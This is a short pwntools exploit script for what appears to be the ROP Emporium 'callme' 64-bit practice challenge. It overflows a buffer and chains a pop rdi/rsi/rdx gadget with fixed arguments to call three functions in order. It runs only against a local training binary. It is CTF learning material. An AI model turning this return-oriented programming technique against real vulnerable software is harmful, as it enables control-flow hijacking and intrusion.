#!/usr/bin/env python3
from pwn import *
##CALLME64
context(os='linux', arch='i386')
offset = 40
callme1 =p64(0x00400720)
callme2 = p64(0x00400740)
callme3 = p64(0x004006f0)
pop_gadget = p64(0x000000000040093c) #pop rdi; pop rsi; pop rdx; ret;

arg1 = p64(0xdeadbeefdeadbeef)
arg2 = p64(0xcafebabecafebabe)
arg3 = p64(0xd00df00dd00df00d)

pad = b'A' * offset

payload = pad
# ogni blocco: [call][pop_gadget][arg1][arg2][arg3]
payload += pop_gadget + arg1 + arg2 + arg3 +callme1
payload += pop_gadget  + arg1 + arg2 + arg3 + callme2
payload += pop_gadget + arg1 + arg2 + arg3 + callme3

p = process("./callme")
p.sendline(payload)
print(p.recvall(timeout=2).decode(errors='ignore'))
# oppure p.interactive()
